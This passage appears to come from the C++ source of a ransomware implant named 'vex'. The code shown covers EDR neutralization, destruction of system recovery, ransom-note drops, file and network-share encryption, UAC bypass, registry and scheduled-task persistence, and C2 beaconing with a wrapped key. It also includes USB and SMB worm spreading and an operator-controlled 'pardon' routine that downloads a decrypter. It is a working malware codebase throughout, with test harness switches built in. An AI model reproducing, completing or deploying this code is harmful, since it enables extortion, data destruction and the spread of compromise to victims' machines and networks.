            eo.shares = config::kEncryptNetworkShares &&
                config::kEnableLateralMovement && !config::g_disableShares;
            engine::EngineResult es{};

            RunGuarded(&KillBlockers);
            RunGuarded(&evasion::NeutralizeEDR);   // unloads the driver
            RunGuarded(&ReportEvasion);
            RunGuarded(&evasion::DestroyRecovery);

            for (wchar_t c = L'C'; c <= L'Z'; c++) {
                wchar_t root[4] = { c, L':', L'\\', 0 };
                if (GetDriveTypeW(root) == DRIVE_FIXED) DropNoteDrive(c, vid);
            }

            // A known sample the victim can verify through the portal: it is
            // encrypted with everything else and decrypts to a text carrying
            // their own victim id.
            {
                std::wstring proofPath = state::DirPath() + L"\\proof.txt";
                std::string proof = "VEX PROOF " + utils::b64(vid, 16) + "\r\n";
                utils::WriteUtf8(proofPath, proof);
            }

            // Never encrypt the file that holds this machine's key.
            engine::Exclude(state::FilePath());

            es = engine::Execute(key, eo);
            return es;
        }

        static engine::EngineResult Run(const uint8_t* key, const uint8_t vid[16]) {
            err::Report("detonate", "begin");
            utils::EnablePrivilege(L"SeDebugPrivilege");
            utils::EnablePrivilege(L"SeTakeOwnershipPrivilege");

            engine::EngineResult es = RunBody(key, vid);

            err::Report("detonate_done",
                "ok=" + std::string(es.ok ? "1" : "0") +
                " sealed=" + std::string(es.journalSealed ? "1" : "0") +
                " files=" + std::to_string(es.stats.files) +
                " bytes=" + std::to_string(es.stats.bytes) +
                " failed=" + std::to_string(es.stats.failed) +
                " skipped=" + std::to_string(es.stats.skipped) +
                " error=" + es.error +
                " sample=" + utils::narrow(state::DirPath() + L"\\proof.txt"));
            return es;
        }
    } // namespace detonate

    // ------------------------------------------------------------------
    // Pardon: the operator (root) releases the machine. The payload pulls the
    // per-victim decrypter from the C2, runs it against the local journal,
    // removes every artifact and self-deletes.
    // ------------------------------------------------------------------
    namespace pardon {
        static std::wstring TempExePath() {
            wchar_t tmp[MAX_PATH]{};
            if (GetTempPathW(MAX_PATH, tmp) == 0) return L"";
            return std::wstring(tmp) + L"~" + utils::RandomHex(8) + L".tmp.exe";
        }

        static void RemoveNotes() {
            for (wchar_t c = L'C'; c <= L'Z'; c++) {
                wchar_t root[4] = { c, L':', L'\\', 0 };
                if (GetDriveTypeW(root) == DRIVE_FIXED) {
                    DeleteFileW((std::wstring(root) + config::kNoteName).c_str());
                }
            }
        }

        static bool JournalGone() {
            std::vector<std::wstring> paths;
            paths.push_back(utils::DefaultJournalPath());
            if (!engine::g_journalOverride.empty())
                paths.push_back(engine::g_journalOverride);
            for (wchar_t c = L'C'; c <= L'Z'; c++) {
                wchar_t root[4] = { c, L':', L'\\', 0 };
                if (GetDriveTypeW(root) == DRIVE_FIXED)
                    paths.push_back(std::wstring(root) + config::kJournalName);
            }
            for (const auto& p : paths) {
                for (const wchar_t* suffix : { L"", L".sig", L".done" }) {
                    std::wstring q = p + suffix;
                    if (GetFileAttributesW(utils::extended(q).c_str())
                            != INVALID_FILE_ATTRIBUTES)
                        return false;
                }
            }
            return true;
        }

        static bool Run(const uint8_t* key, const uint8_t vid[16]) {
            (void)key; // the decrypter carries the key injected by the panel

            std::wstring exe = TempExePath();
            if (exe.empty()) return false;
            DeleteFileW(exe.c_str());

            bool downloaded = false;
            for (int attempt = 0; attempt < 3 && !downloaded; attempt++) {
                downloaded = comms::DownloadPardon(vid, exe);
                if (!downloaded) Sleep(15000);
            }
            if (!downloaded) return false;

            std::wstring cmd = L"\"" + exe + L"\" --quiet --no-pause --no-elevate";
            STARTUPINFOW si{};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;
            PROCESS_INFORMATION pi{};
            if (!CreateProcessW(NULL, &cmd[0], NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                DeleteFileW(exe.c_str());
                err::Report("pardon_failed", "spawn");
                return false;
            }

            DWORD rc = 1;
            WaitForSingleObject(pi.hProcess, 30 * 60 * 1000);
            GetExitCodeProcess(pi.hProcess, &rc);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            DeleteFileW(exe.c_str());

            if (rc != 0) {
                err::Report("pardon_failed", "exit=" + std::to_string(rc));
                return false;
            }
            if (!JournalGone()) {
                err::Report("pardon_failed", "journal_still_present");
                return false;
            }

            RemoveNotes();
            DeleteFileW((state::DirPath() + L"\\proof.txt").c_str());
            persist::Remove();
            err::Report("pardon_done", "ok=1 journal=removed");
            state::Remove();
            utils::SelfDelete();
            return true;
        }
    } // namespace pardon
} // namespace vex

// ============================================================================
// 9. ENTRY POINT
// ============================================================================
static std::wstring g_uacEventName = L"Local\\VexUacDone";

static bool IsElevated() {
    HANDLE tok = NULL;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tok)) return false;
    TOKEN_ELEVATION te{};
    DWORD sz = sizeof(te);
    bool out = GetTokenInformation(tok, TokenElevation, &te, sz, &sz) && te.TokenIsElevated;
    CloseHandle(tok);
    return out;
}

static std::string GetOSVersion() {
    typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr fxPtr = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (fxPtr != nullptr) {
            RTL_OSVERSIONINFOW rovi = { 0 };
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (fxPtr(&rovi) == 0) {
                return std::to_string(rovi.dwMajorVersion) + "." +
                    std::to_string(rovi.dwMinorVersion) + "." +
                    std::to_string(rovi.dwBuildNumber);
            }
        }
    }
    return "Unknown";
}

int main(int argc, char* argv[]) {
    // Helper process for dormant-memory obfuscation: must run before any
    // normal payload setup so it never beacons or installs persistence.
    if (argc >= 6 && strcmp(argv[1], "--sleep-helper") == 0)
        return vex::sleepcrypt::HelperMain(argc, argv);

    // One implant instance per host. Persistence can start us from Run keys,
    // a SYSTEM task and IFEO; concurrent writers corrupt the journal.
    HANDLE instanceMutex = CreateMutexW(NULL, TRUE, L"Global\\VexPayloadInstance");
    if (!instanceMutex)
        instanceMutex = CreateMutexW(NULL, TRUE, L"Local\\VexPayloadInstance");
    if (instanceMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(instanceMutex);
        return 0;
    }

    // Runtime switches, for VM work only. Production runs ignore them.
    //   --ping-ms N     shorter sleeper cadence (also shortens registration retry)
    //   --no-persist    skip Run keys / logon task
    //   --no-spread     skip USB watcher and SMB spray
    //   --selftest      loader smoke test
    //   --shares        print local shares and exit
    //   harness: --encrypt <path> [--journal <p>] [--key-out <p>] [--dry-run]
    //            [--stats] [--throttle N] [--threads N] [--no-priority]
    DWORD pingIntervalMs = vex::config::kPingIntervalMs;
    DWORD pingJitterMs = vex::config::kPingJitterMs;
    bool installPersistence = true;
    bool noElevate = false;
    bool netEnum = false;
    bool startSpread = false;   // worm is opt-in: --spread
    bool selftest = false;
    bool showShares = false;
    bool dryRun = false;
    bool showStats = false;
    bool persistPreview = false;
    bool safe = false;
    bool uacChild = false;
    bool ifeoChild = false;
    bool optPriority = true;
    bool sleepCryptFlag = false;
    DWORD sleepCryptMs = 0;
    std::wstring pidOutPath;
    std::wstring stateSelftestDir;
    std::wstring wipeSelftestDir;
    uint32_t throttlePerSec = 0;
    unsigned threadOverride = 0;
    std::wstring encryptRoot, journalPath, keyOutPath;

    // Wide argv: Windows command lines are UTF-16. Parsing the ANSI argv
    // corrupts non-ASCII paths (and lets ACP bytes masquerade as UTF-8).
    int wargc = 0;
    LPWSTR* wargv = CommandLineToArgvW(GetCommandLineW(), &wargc);
    std::vector<std::wstring> wargs;
    if (wargv) {
        for (int i = 0; i < wargc; i++) wargs.emplace_back(wargv[i]);
        LocalFree(wargv);
    }
    if (wargs.empty()) {
        for (int i = 0; i < argc; i++) wargs.push_back(vex::utils::widen(argv[i]));
    }

    for (size_t i = 1; i < wargs.size(); i++) {
        const std::wstring& a = wargs[i];
        auto next = [&](std::wstring& out) -> bool {
            if (i + 1 >= wargs.size()) return false;
            out = wargs[++i];
            return true;
        };
        std::wstring val;
        if (a == L"--ping-ms" && next(val)) {
            wchar_t* end = nullptr;
            unsigned long v = wcstoul(val.c_str(), &end, 10);
            if (!end || *end || v < 1000 || v > 86400000ull) {
                wprintf(L"[-] --ping-ms needs 1000..86400000\n");
                return 2;
            }
            pingIntervalMs = (DWORD)v;
            pingJitterMs = 0;
        }
        else if (a == L"--no-persist") installPersistence = false;
        else if (a == L"--no-elevate") noElevate = true;
        else if (a == L"--net-enum") netEnum = true;
        else if (a == L"--spread") startSpread = true;
        else if (a == L"--no-spread") {
            startSpread = false;
            vex::config::g_disableShares = true;
            vex::config::g_disableUsb = true;
        }
        else if (a == L"--no-shares") vex::config::g_disableShares = true;
        else if (a == L"--no-usb") vex::config::g_disableUsb = true;
        else if (a == L"--selftest") selftest = true;
        else if (a == L"--shares") showShares = true;
        else if (a == L"--dry-run") dryRun = true;
        else if (a == L"--stats") showStats = true;
        else if (a == L"--persist-preview") persistPreview = true;
        else if (a == L"--safe") safe = true;
        else if (a == L"--uac-child") uacChild = true;
        else if (a == L"--uac-event" && next(val)) g_uacEventName = val;
        else if (a == L"--ifeo") ifeoChild = true;
        else if (a == L"--no-priority") optPriority = false;
        else if (a == L"--sleep-crypt") sleepCryptFlag = true;
        else if (a == L"--sleep-crypt-ms" && next(val)) {
            wchar_t* end = nullptr;
            unsigned long v = wcstoul(val.c_str(), &end, 10);
            if (!end || *end || v < 1000 || v > 86400000ull) {
                wprintf(L"[-] --sleep-crypt-ms needs 1000..86400000\n");
                return 2;
            }
            sleepCryptMs = (DWORD)v;
        }
        else if (a == L"--pid-out" && next(val)) pidOutPath = val;
        else if (a == L"--state-selftest" && next(val)) stateSelftestDir = val;
        else if (a == L"--wipe-selftest" && next(val)) wipeSelftestDir = val;
        else if (a == L"--throttle" && next(val)) {
            wchar_t* end = nullptr;
            unsigned long v = wcstoul(val.c_str(), &end, 10);
            throttlePerSec = (!end || *end || v > 10000) ? 0 : (uint32_t)v;
        }
        else if (a == L"--threads" && next(val)) {
            wchar_t* end = nullptr;
            unsigned long v = wcstoul(val.c_str(), &end, 10);
            threadOverride = (!end || *end) ? 0 : (unsigned)(std::max)(1ul, (std::min)(v, 16ul));
        }
        else if (a == L"--encrypt" && next(val)) encryptRoot = val;
        else if (a == L"--journal" && next(val)) journalPath = val;
        else if (a == L"--key-out" && next(val)) keyOutPath = val;
        else if (a == L"--c2" && next(val)) {
            // Harness/E2E only: point the payload at a local panel.
            std::wstring url = val;
            bool secure = true;
            size_t p = url.find(L"://");
            if (p != std::wstring::npos) {
                std::wstring scheme = url.substr(0, p);
                secure = _wcsicmp(scheme.c_str(), L"http") != 0;
                url = url.substr(p + 3);
            }
            size_t slash = url.find(L'/');
            if (slash != std::wstring::npos) url = url.substr(0, slash);
            uint16_t port = secure ? 443 : 80;
            size_t colon = url.rfind(L':');
            if (colon != std::wstring::npos) {
                wchar_t* end = nullptr;
                unsigned long pv = wcstoul(url.substr(colon + 1).c_str(), &end, 10);
                if (!end || *end || pv == 0 || pv > 65535) {
                    wprintf(L"[-] bad --c2 port\n");
                    return 2;
                }
                port = (uint16_t)pv;
                url = url.substr(0, colon);
            }
            if (url.empty() || url.size() > 253 || !vex::comms::ValidHost(url)) {
                wprintf(L"[-] bad --c2 host\n");
                return 2;
            }
            vex::comms::SetEndpoint(url, port, secure);
        }
        // Loader-side switches are forwarded verbatim by xloader; consume
        // them here so strict argument checking does not abort staged runs.
        else if (a == L"--stage" || a == L"--token" ||
                 a == L"--token-file" || a == L"--file") {
            next(val);
        }
        else if (a == L"--inspect" || a == L"--vm-check" ||
                 a == L"--no-amsi" || a == L"--no-etw" ||
                 a == L"--no-unhook" || a == L"-v" || a == L"--verbose") {
            // handled by the loader
        }
        else {
            wprintf(L"[-] unknown argument: %ls\n", a.c_str());
            return 2;
        }
    }

    if (!wipeSelftestDir.empty() || !stateSelftestDir.empty()) {
        wchar_t allow[16]{};
        DWORD n = GetEnvironmentVariableW(L"VEX_ALLOW_PAYLOAD", allow, 16);
        if (n == 0 || wcscmp(allow, L"1") != 0) {
            printf("[-] selftest harness refused: set VEX_ALLOW_PAYLOAD=1\n");
            return 2;
        }
    }

    if (!wipeSelftestDir.empty()) {
        vex::crypto::Init();
        vex::state::SetDirOverride(wipeSelftestDir);
        vex::config::g_wipeTestMode = true;
        vex::config::g_wipeJournalOverride = wipeSelftestDir + L"\\wipe.jnl";
        uint8_t key[32];
        memset(key, 0x42, sizeof(key));
        uint8_t vid[16]{};
        auto build = [&](const std::wstring& jpath,
                         const std::vector<std::wstring>& files) -> bool {
            std::string data("VXJ2", 4);
            uint32_t ver = 3, flags = 0;
            data.append((const char*)&ver, 4);
            data.append((const char*)&flags, 4);
            for (const auto& f : files) {
                std::string orig = vex::utils::EscapeJournalPath(f);
                std::string body(24 + 32 + 8, '\0');
                uint64_t size = 4;
                memcpy(&body[24 + 32], &size, 8);
                uint32_t ol = (uint32_t)orig.size();
                body.append((const char*)&ol, 4);
                body.append(orig);
                body.append((const char*)&ol, 4);
                body.append(orig);
                uint32_t len = (uint32_t)body.size();
                uint32_t crc = vex::crypto::Crc32((const uint8_t*)body.data(), body.size());
                data.append((const char*)&len, 4);
                data.append((const char*)&crc, 4);
                data.append(body);
            }
            std::ofstream out(jpath, std::ios::binary | std::ios::trunc);
            out.write(data.data(), (std::streamsize)data.size());
            out.close();
            std::string mac = vex::crypto::HmacSha256Hex(key, sizeof(key), data);
            std::ofstream sig(jpath + L".sig", std::ios::binary | std::ios::trunc);
            sig << mac << "\n";
            sig.close();
            return !mac.empty();
        };
        auto makeFile = [&](const std::wstring& p) {
            std::ofstream f(p, std::ios::binary | std::ios::trunc);
            f.write("VEX2", 4);
            f.write("test", 4);
        };
        std::wstring a = wipeSelftestDir + L"\\a.dat";
        std::wstring b = wipeSelftestDir + L"\\b.dat";
        makeFile(a); makeFile(b);
        bool sealed = build(vex::config::g_wipeJournalOverride, { a, b });
        auto good = vex::tasks::Execute(vid, "wipe", "", key);
        bool deleted = !std::ifstream(a.c_str()).good() &&
            !std::ifstream(b.c_str()).good();

        std::wstring c = wipeSelftestDir + L"\\c.dat";
        makeFile(c);
        bool sealed2 = build(vex::config::g_wipeJournalOverride, { c });
        // Tamper the journal after signing.
        {
            std::fstream f(vex::config::g_wipeJournalOverride,
                std::ios::in | std::ios::out | std::ios::binary);
            f.seekp(13);
            char z = 0x7F;
            f.write(&z, 1);
        }
        auto bad = vex::tasks::Execute(vid, "wipe", "", key);
        bool kept = std::ifstream(c.c_str()).good();
        bool all = sealed && deleted && good.uninstall && sealed2 &&
            !bad.uninstall && kept;
        printf("[wipe-selftest] sealed=%d deleted=%d good=%d kept=%d bad=%d\n",
            sealed ? 1 : 0, deleted ? 1 : 0, good.uninstall ? 1 : 0,
            kept ? 1 : 0, bad.uninstall ? 0 : 1);
        return all ? 0 : 1;
    }

    if (!stateSelftestDir.empty()) {
        vex::crypto::Init();
        vex::state::SetDirOverride(stateSelftestDir);
        vex::state::State a{};
        for (int i = 0; i < 16; i++) a.vid[i] = (uint8_t)(i + 1);
        for (int i = 0; i < 32; i++) a.key[i] = (uint8_t)(0xA0 + i);
        a.phase = 1;
        bool saved = vex::state::Save(a);
        vex::state::State b{};
        bool loaded = vex::state::Load(b);
        bool same = loaded && b.phase == a.phase &&
            memcmp(b.vid, a.vid, 16) == 0 && memcmp(b.key, a.key, 32) == 0;
        // Kill slot A; slot B must still carry the state.
        {
            SetFileAttributesW(vex::state::SlotPath(0).c_str(), FILE_ATTRIBUTE_NORMAL);
            HANDLE h = CreateFileW(vex::state::SlotPath(0).c_str(), GENERIC_WRITE,
                0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
        }
        vex::state::State c{};
        bool fallback = vex::state::Load(c) && c.phase == a.phase &&
            memcmp(c.key, a.key, 32) == 0;
        // Both corrupt: Load must fail, Exists must stay true.
        {
            SetFileAttributesW(vex::state::SlotPath(1).c_str(), FILE_ATTRIBUTE_NORMAL);
            HANDLE h = CreateFileW(vex::state::SlotPath(1).c_str(), GENERIC_WRITE,
                0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
        }
        vex::state::State d{};
        bool allBad = !vex::state::Load(d) && vex::state::Exists();
        vex::state::Remove();
        bool gone = !vex::state::Exists();
        bool all = saved && same && fallback && allBad && gone;
        printf("[state-selftest] saved=%d same=%d fallback=%d allbad=%d gone=%d\n",
            saved ? 1 : 0, same ? 1 : 0, fallback ? 1 : 0,
            allBad ? 1 : 0, gone ? 1 : 0);
        return all ? 0 : 1;
    }

    if (sleepCryptMs) {
        // Dormancy harness: no beacon, no persistence, no encryption.
        vex::crypto::Init();
        if (!pidOutPath.empty())
            vex::utils::WriteUtf8(pidOutPath,
                std::to_string(GetCurrentProcessId()) + "\n");
        bool ok = true;
        if (sleepCryptFlag)
            ok = vex::sleepcrypt::ObfuscatedSleep(sleepCryptMs);
        else
            Sleep(sleepCryptMs);
        printf("[sleep] woke crypt=%d\n", ok ? 1 : 0);
        return 0;
    }
    vex::config::g_sleepCrypt = sleepCryptFlag;

    // Elevation children: keep the console out of sight and let the parent
    // know the bypass worked before doing anything else.
    if (uacChild || ifeoChild) {
        if (HWND cw = GetConsoleWindow()) ShowWindow(cw, SW_HIDE);
    }
    if (uacChild) {
        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, g_uacEventName.c_str());
        if (!ev) ev = CreateEventW(NULL, TRUE, FALSE, g_uacEventName.c_str());
        if (ev) { SetEvent(ev); CloseHandle(ev); }
    }

    if (safe) {
        // Refuse implant mode: only explicit harness actions are allowed, and
        // no persistence, spread or beacon can be reached from here.
        bool harness = !encryptRoot.empty() || dryRun || selftest || showShares ||
            netEnum || persistPreview;
        if (!harness) {
            printf("[safe] refusing implant mode: pass --encrypt <path>, --dry-run, "
                   "--selftest, --shares, --net-enum or --persist-preview\n");
            return 2;
        }
        installPersistence = false;
        startSpread = false;
        vex::config::g_disableShares = true;
        vex::config::g_disableUsb = true;
    }

    if (persistPreview) {
        // Harness: print the exact Run value and logon-task command without
        // writing a registry key or creating a task.
        std::wstring args = vex::persist::BuildPersistArgs(startSpread,
            vex::config::g_disableUsb, vex::config::g_disableShares, pingIntervalMs,
            sleepCryptFlag);
        std::wstring run = L"\"" + vex::persist::InstalledPath() + L"\"";
        if (!args.empty()) run += L" " + args;
        wprintf(L"run=%ls\n", run.c_str());
        wprintf(L"task_xml=%ls\n", vex::persist::TaskXml(args).c_str());
        return 0;
    }

    if (showShares) {
        SHARE_INFO_2* buf = nullptr;
        DWORD read = 0, total = 0, resume = 0;
        NET_API_STATUS ns = NetShareEnum(NULL, 2, (LPBYTE*)&buf,
            MAX_PREFERRED_LENGTH, &read, &total, &resume);
        if (ns != NERR_Success && ns != ERROR_MORE_DATA) {
            printf("[-] NetShareEnum failed: %lu\n", (unsigned long)ns);
            return 1;
        }
        printf("[shares] %lu local:\n", (unsigned long)read);
        for (DWORD k = 0; k < read; k++) {
            printf("  %-24ls type=0x%08lx path=%ls\n",
                buf[k].shi2_netname ? buf[k].shi2_netname : L"?",
                (unsigned long)buf[k].shi2_type,
                buf[k].shi2_path ? buf[k].shi2_path : L"");
        }
        NetApiBufferFree(buf);
        return 0;
    }

    // Engine harness: no beacon, no persistence, no spread, no elevation.
    if (!encryptRoot.empty() || dryRun) {
        if (encryptRoot.empty()) {
            printf("[-] --dry-run needs --encrypt <path>\n");
            return 1;
        }
        if (!vex::crypto::Init()) {
            printf("[-] bcrypt init failed\n");
            return 1;
        }

        uint8_t key[32]{};
        if (!vex::crypto::GenAesKey(key)) {
            printf("[-] RNG failure\n");
            return 1;
        }

        if (!keyOutPath.empty()) {
            if (GetFileAttributesW(vex::utils::extended(keyOutPath).c_str())
                    != INVALID_FILE_ATTRIBUTES) {
                SecureZeroMemory(key, sizeof(key));
                printf("[-] key file already exists; refusing to overwrite it\n");
                return 1;
            }
            std::string line = vex::utils::b64(key, sizeof(key)) + "\n";
            if (!vex::utils::WriteUtf8(keyOutPath, line)) {
                SecureZeroMemory(key, sizeof(key));
                printf("[-] could not write key file; refusing to encrypt\n");
                return 1;
            }
        }

        vex::engine::g_journalOverride = journalPath;
        if (!journalPath.empty()) vex::engine::Exclude(journalPath);
        if (!keyOutPath.empty()) vex::engine::Exclude(keyOutPath);

        vex::engine::Options o;
        o.dryRun = dryRun;
        o.priority = optPriority;
        o.throttlePerSec = throttlePerSec;
        o.threads = threadOverride;
        // An explicit root never pulls in shares/cloud — that is for detonate.
        o.shares = false;
        o.cloud = false;

        vex::engine::EngineResult er = vex::engine::Execute(
            key, o, encryptRoot.empty() ? std::wstring() : encryptRoot);
        vex::engine::Stats& st = er.stats;
        if (!er.ok) {
            printf("[-] engine failed: %s\n", er.error.c_str());
            SecureZeroMemory(key, sizeof(key));
            return 1;
        }

        if (showStats || !dryRun) {
            double sec = st.elapsedMs / 1000.0;
            double mib = st.bytes / 1048576.0;
            printf("[stats] files=%llu bytes=%llu (%.1f MiB) failed=%llu skipped=%llu "
                   "time=%.2fs rate=%.1f MiB/s\n",
                (unsigned long long)st.files, (unsigned long long)st.bytes,
                mib, (unsigned long long)st.failed, (unsigned long long)st.skipped,
                sec, sec > 0 ? mib / sec : 0.0);
        }

        SecureZeroMemory(key, sizeof(key));
        return 0;
    }

    // Loader smoke test: proves the image survived reflective mapping (CRT,
    // threads, bcrypt) without beaconing or touching the machine.
    if (selftest) {
        printf("[selftest] payload alive pid=%lu\n", (unsigned long)GetCurrentProcessId());
        fflush(stdout);

        std::thread probe([] {
            std::mutex m;
            std::lock_guard<std::mutex> g(m);
            });
        probe.join();

        if (vex::crypto::Init()) {
            uint8_t k[32]{};
            if (!vex::crypto::GenAesKey(k)) {
                printf("[selftest] rng failure\n");
                return 1;
            }
            printf("[selftest] crypto ok driver_hash=%d\n",
                vex::evasion::DriverHashOk() ? 1 : 0);

            // Prove the embedded modulus pairs with the C2 private key:
            // the C2 unwraps this blob; a mismatch means unrecoverable hosts.
            uint8_t wrapped[256] = { 0 };
            uint16_t wl = 0;
            if (vex::crypto::WrapKey(k, wrapped, &wl)) {
                // Never print key material, even in a selftest log.
                printf("[selftest] aes_key_len=32 wrapped_len=%u\n", wl);
            std::string mac = vex::crypto::HmacSha256Hex(
                (const uint8_t*)"key", 3, "data");
            printf("[selftest] hmac=%s\n", mac.c_str());
            }
            else {
                printf("[selftest] wrap FAILED\n");
            }
            SecureZeroMemory(k, sizeof(k));
            SecureZeroMemory(wrapped, sizeof(wrapped));
        }
        else {
            printf("[selftest] crypto init FAILED\n");
        }
        printf("[selftest] done\n");
        fflush(stdout);
        return 0;
    }

    if (netEnum) {
        auto hosts = vex::spread::EnumerateHosts(256);
        printf("[net-enum] %zu candidates\n", hosts.size());
        for (uint32_t ip : hosts)
            printf("%s\n", vex::spread::IpToString(ip).c_str());
        return 0;
    }

    if (!IsElevated() && !noElevate) {
        wchar_t self[MAX_PATH]{};
        if (GetModuleFileNameW(NULL, self, MAX_PATH)) {
            std::wstring tail = vex::utils::CommandLineTail();
            // Silent path first; the runas prompt is the fallback.
            if (vex::evasion::TryUACBypass(self, tail)) return 0;
            SHELLEXECUTEINFOW sei{ sizeof(sei) };
            std::wstring params = L"--uac-child";
            if (!tail.empty()) params += L" " + tail;
            sei.lpVerb = L"runas";
            sei.lpFile = self;
            sei.lpParameters = params.c_str();
            sei.nShow = SW_NORMAL;
            if (ShellExecuteExW(&sei)) return 0;
        }
        return 1;
    }

    if (!vex::crypto::Init()) return 1;
    if (!vex::comms::Init()) return 1;
    vex::comms::LoadSecret();
    vex::err::Install();

    // Reboot resilience: the state file carries the VID and AES key across
    // process death, so a reboot never changes the key under encrypted files.
    vex::state::State st{};
    bool haveState = vex::state::Load(st);

    // A state file that exists but cannot be read (corruption, a disk moved
    // between machines, DPAPI scope change) must never be silently replaced:
    // a fresh key over already-encrypted files cannot be recovered. Report and
    // stop; the operator can still resolve it with the stored VID/key.
    if (!haveState && vex::state::Exists()) {
        vex::err::Report("fatal_state",
            "state present but unreadable; refusing to re-key");
        return 1;
    }

    if (haveState && st.phase == 2) {
        // A finished machine. Persistence must not keep resurrecting us.
        vex::persist::Remove();
        vex::utils::SelfDelete();
        return 0;
    }

    if (haveState && st.phase == 1) {
        // Rebooted mid-encryption: finish with the same key.
        vex::err::SetVid(st.vid);
        auto er = vex::detonate::Run(st.key, st.vid);
        if (!er.ok || !er.journalSealed) {
            vex::err::Report("fatal_engine", "resume: " + er.error);
            printf("[-] resume detonation failed: %s\n", er.error.c_str());
            SecureZeroMemory(st.key, sizeof(st.key));
            return 1;
        }
        st.phase = 2;
        if (!vex::state::Save(st)) {
            vex::err::Report("fatal_state", "phase2 save failed after resume");
            SecureZeroMemory(st.key, sizeof(st.key));
            return 1;
        }
        vex::persist::Remove();
        vex::utils::SelfDelete();
        vex::evasion::UnloadDriver();
        return 0;
    }

    if (!haveState) {
        if (!vex::crypto::GenAesKey(st.key)) {
            printf("[-] RNG failure\n");
            return 1;
        }
        vex::crypto::api.GenRandom(NULL, st.vid, sizeof(st.vid),
            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        st.phase = 0;
        if (!vex::state::Save(st)) {
            printf("[-] state cannot be persisted; refusing to encrypt\n");
            return 1;
        }
    }

    vex::err::SetVid(st.vid);

    uint8_t wrapped[256] = { 0 };
    uint16_t wrappedLen = 0;
    if (!vex::crypto::WrapKey(st.key, wrapped, &wrappedLen)) return 1;

    // Phone home. If the operator never receives a key, the payload refuses
    // to encrypt: no bricked host without a way back. Offline hosts retry for
    // 24 hours (10 min + jitter) before giving up.
    std::string osVer = GetOSVersion();
    const uint64_t retryDeadline = GetTickCount64() + vex::config::kBeaconRetryWindowMs;
    bool registered = false;
    while (!registered && GetTickCount64() < retryDeadline) {
        registered = vex::comms::Beacon(st.vid, wrapped, osVer);
        if (registered) break;
        ULONG j = 0;
        vex::crypto::api.GenRandom(NULL, (PUCHAR)&j, sizeof(j),
            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        Sleep(vex::config::kBeaconRetryMs + (j % (2u * 60u * 1000u)));
    }
    if (!registered) {
        SecureZeroMemory(st.key, sizeof(st.key));
        return 1;
    }
    if (!vex::comms::HasSecret()) {
        // The panel no longer re-delivers secrets to existing VIDs; without a
        // local secret the payload cannot sign. Refuse to run unauthenticated.
        vex::err::Report("fatal_state", "no signing secret");
        SecureZeroMemory(st.key, sizeof(st.key));
        return 1;
    }

    // Persistence must carry the same behaviour across a reboot: without
    // --spread the USB watcher and SMB spray never start again, and a tuned
    // ping cadence would silently revert to the compile-time default.
    std::wstring persistArgs = vex::persist::BuildPersistArgs(startSpread,
        vex::config::g_disableUsb, vex::config::g_disableShares, pingIntervalMs,
        sleepCryptFlag);

    if (installPersistence) {
        bool ok = vex::persist::Install(persistArgs);
        vex::err::Report("persist", ok ? "installed" : "failed");
    }

    // Worm modules run while dormant: seed the network and the sneakernet
    // before anyone presses the button. Both require the lateral-movement
    // feature flag and are suppressed by --no-spread.
    if (startSpread && vex::config::kEnableLateralMovement) {
        if (!vex::config::g_disableUsb)
            vex::spread::StartUsbWatcher();
        if (!vex::config::g_disableShares)
            vex::spread::StartSmbSpray();
    }

    std::string action;
    for (;;) {
        action = vex::sleeper::Wait(st.vid, pingIntervalMs, pingJitterMs, st.key);

        if (action == "pardon") {
            // Root released this machine: the C2 serves the per-victim
            // decrypter, the payload runs it, cleans up and self-deletes.
            if (vex::pardon::Run(st.key, st.vid)) return 0;
            // Download/decrypt failed: the panel keeps pardon=1, retry later.
            Sleep(60000);
            continue;
        }
        if (action == "kill") {
            // Operator pulled the plug: remove persistence and self-delete.
            // If a journal exists, this host has encrypted data; deleting the
            // journal/state would destroy the only recovery path.
            vex::persist::Remove();
            std::wstring defaultJournal = vex::utils::DefaultJournalPath();
            bool haveJournal = GetFileAttributesW(
                vex::utils::extended(defaultJournal).c_str()) != INVALID_FILE_ATTRIBUTES;
            if (!vex::engine::g_journalOverride.empty() &&
                GetFileAttributesW(vex::utils::extended(
                    vex::engine::g_journalOverride).c_str()) != INVALID_FILE_ATTRIBUTES)
                haveJournal = true;
            if (!haveJournal) {
                DeleteFileW(vex::utils::extended(defaultJournal).c_str());
                DeleteFileW(vex::utils::extended(defaultJournal + L".done").c_str());
                if (!vex::engine::g_journalOverride.empty()) {
                    DeleteFileW(vex::utils::extended(vex::engine::g_journalOverride).c_str());
                    DeleteFileW(vex::utils::extended(
                        vex::engine::g_journalOverride + L".done").c_str());
                }
                vex::state::Remove();
            } else {
                vex::err::Report("kill", "recovery material kept (journal present)");
            }
            vex::evasion::UnloadDriver();
            vex::utils::SelfDelete();
            return 0;
        }
        break; // detonate
    }

    // DETONATE.
    st.phase = 1;
    if (!vex::state::Save(st)) {
        vex::err::Report("fatal_state", "phase1 save failed");
        printf("[-] phase1 state save failed; refusing to encrypt\n");
        return 1;
    }

    vex::engine::EngineResult er = vex::detonate::Run(st.key, st.vid);

    if (!er.ok || !er.journalSealed) {
        vex::err::Report("fatal_engine", "detonate: " + er.error);
        printf("[-] detonation incomplete; recovery material kept\n");
        SecureZeroMemory(st.key, sizeof(st.key));
        return 1;
    }

    st.phase = 2;
    if (!vex::state::Save(st)) {
        vex::err::Report("fatal_state", "phase2 save failed");
        printf("[-] phase2 state save failed; recovery material kept\n");
        SecureZeroMemory(st.key, sizeof(st.key));
        return 1;
    }
